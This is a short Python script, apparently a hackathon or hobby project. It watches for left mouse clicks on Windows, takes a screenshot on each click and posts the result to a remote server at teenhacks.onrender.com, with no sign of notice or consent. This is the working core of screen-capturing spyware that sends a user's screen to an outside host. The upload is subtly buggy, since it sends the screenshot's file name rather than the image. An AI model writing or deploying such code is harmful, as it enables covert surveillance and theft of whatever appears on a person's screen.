from mss import mss
from win32api import GetKeyState
import time
import requests

def take_screenshot():
    with mss() as sct:
        img_sct = sct.shot()
        try:
            response = requests.get('https://teenhacks.onrender.com/')
            if response.status_code != 200:
                raise Exception('Failed to retrieve website')
        except Exception as e:
            print(f'Failed to retrieve website: {str(e)}')
            return
    requests.post('https://teenhacks.onrender.com/upload', data=img_sct)


        #sct.shot(output=f"Screenshots/screenshot{time.time()}.png")

def begin_ss(start):
    leftClick = GetKeyState(0x01)
    if leftClick < 0:
        if time.time() - start > .3:
            take_screenshot()
        start = time.time()
    time.sleep(.001)
    return start